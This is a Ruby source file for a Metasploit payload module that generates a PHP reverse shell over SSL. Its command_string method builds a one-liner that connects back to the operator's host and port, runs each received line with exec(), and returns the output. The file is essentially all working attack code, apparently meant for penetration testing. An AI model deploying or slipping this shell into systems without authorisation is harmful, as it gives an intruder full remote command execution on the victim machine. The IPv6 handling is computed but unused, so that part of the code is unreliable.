##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via php)',
      'Description'   => 'Creates an interactive shell via php, uses SSL',
      'Author'        => 'RageLtMan',
      'License'       => BSD_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'php',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    cmd = "php -r '$s=fsockopen(\"ssl://#{datastore['LHOST']}\",#{datastore['LPORT']});while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}'&"
  end

end
